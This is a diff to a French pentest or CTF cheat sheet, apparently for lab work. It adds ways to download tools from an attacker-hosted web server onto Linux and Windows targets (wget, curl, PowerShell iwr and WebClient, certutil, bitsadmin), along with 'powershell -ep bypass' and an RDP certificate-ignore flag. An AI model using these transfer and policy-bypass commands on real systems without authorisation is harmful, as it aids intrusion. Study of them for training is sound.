@@ -22,15 +22,35 @@ dir /s /b /a C:\flag.txt
 
 ```bash
 # RDP
-xfreerdp /dynamic-resolution /u:'student' /p:'lab' /v:192.168.151.152
+xfreerdp /dynamic-resolution /cert:ignore /u:'student' /p:'lab' /v:192.168.151.152
 ```
 
 ## Host un serveur web pour dl des fichiers
 
 ```bash
-python3 -m http.server 80 -d <chemin> 
-curl http://>
-wget http://>
+python3 -m http.server 80 -d <chemin>
+```
+
+**Linux**
+```bash
+wget http://<ip>/script.exe
+curl -O http://<ip>/script.exe
+```
+
+**Windows**
+
+```powershell
+# PowerShell
+iwr -uri http://<IP>/fichier -Outfile fichier
+(New-Object Net.WebClient).DownloadFile('http://<IP>/fichier', 'fichier')
+
+curl -o fichier http://<IP>/fichier
+
+# certutil (cmd)
+certutil -urlcache -split -f http://<IP>/fichier fichier
+
+# bitsadmin (cmd)
+bitsadmin /transfer job http://<IP>/fichier C:\chemin\fichier
 ```
 
 ## Tunnels SSH
@@ -42,6 +62,7 @@ sh -f -NL 1234:localhost:5432 user@IP
 ## ExecutionPolicy
 
 ```powershell
+powershell -ep bypass
 Get-ExecutionPolicy
 Set-ExecutionPolicy Unrestricted -Scope Process
 ```
